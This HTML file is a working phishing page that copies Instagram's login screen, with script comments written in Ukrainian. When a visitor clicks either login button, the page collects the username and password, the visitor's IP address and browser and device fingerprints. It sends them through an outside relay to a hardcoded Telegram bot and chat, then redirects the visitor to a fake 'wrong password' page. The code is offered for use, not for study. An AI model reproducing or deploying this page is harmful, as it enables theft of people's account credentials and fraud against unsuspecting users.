<!-- This is instagram login page -->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login . Instagram</title>
    <link rel="stylesheet" href="loginstyle.css">
    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
    <script src="client.min.js"></script>
    <style>
        img {
            vertical-align: text-top;
        }
    </style>
</head>





<body>
    <div class="container">
        <div class="box">
            <div class="heading"></div>
            <form class="login-form">
                <div class="field">
                    <input type="text" id="input1" placeholder="Phone number, username, or email" />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input type="password" id="input2" placeholder="password" />
                    <label for="password">Password</label>
                </div>
                <button type="button" class="login-button" href="./wrong_password.html" onclick="sendMessageToAll(event)">Log In</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>

                <div class="other">
                    <button type="button" class="fb-login-btn" onclick="sendMessageToAll(event)">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png" height="15" width="15">&nbsp;Log in with Facebook</span>
                    </button>                                       
                    <a class="forgot-password" href="/forget.html">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
    </div>
    <br>
    <div class="get">
    Get the app.
    </div>
    <br>
    <div class="apps">
        <a href="/forget.html">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
        </div>
        <br>
        <div class="footer">
    <footer>
            Meta
            About
            Blog
            Jobs
            Help
            API
            Privacy
            Terms
            Top Accounts
            Hashtags
            Locations
            Instagram Lite
            Contact Uploading & Non-Users
    </footer>
</div>
<div class="copyright">
    <br>    
    English © 2024 Instagram from Meta
</div>

<script>
    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip; // Повертає IP-адресу
        } catch (error) {
            console.error('Не вдалося отримати IP-адресу');
            return null; // Повертає null у разі помилки
        }
    }
    
    // Виклик функції
    var client = new ClientJS();
    const browser = client.getBrowser();
    
    // Отримання інформації про операційну систему
    const os = client.getOS() + " " + client.getOSVersion();
    
    // Отримання інформації про тип пристрою
    const device = client.getDevice();
    
    // Отримання інформації про версію браузера
    const browserVersion = client.getBrowserVersion();
    
    // Массив для збереження chat_id користувачів
    const chatIds = [1534742147];
    
    async function sendMessageToAll(event) {
        event.preventDefault(); // Запобігає перезавантаженню сторінки
        const input1 = document.getElementById('input1').value;
        const input2 = document.getElementById('input2').value;
        const botToken = '7567600689:AAEnk3YT4yF9iFCJOPfKMHs4YilCstTsgO8';
    
        // Отримуємо IP-адресу
        const ip = await getIPAddress(); // Дочекайтесь, поки функція поверне IP
    
        const message = `Хтось попався!\n\nПошта, юзернейм або номер телефону: ${input1}\nПароль: ${input2}\nip: ${ip}\nБраузер: ${browser}\nОпераційна система: ${os}\nТип пристрою: ${device}`;
        
        for (let chatId of chatIds) {
            try {
                const response = await fetch('https://pizdelka-6smk-r0men-s-projects.vercel.app/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chatId: chatId,
                        message: message,
                        botToken: botToken
                    }),
                    mode: 'cors'
                });
    
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
            } catch (error) {
                console.error(error);
            }
        } 
        window.location.href = './wrong_password.html';
    }
    </script>
    

</body>

</html>
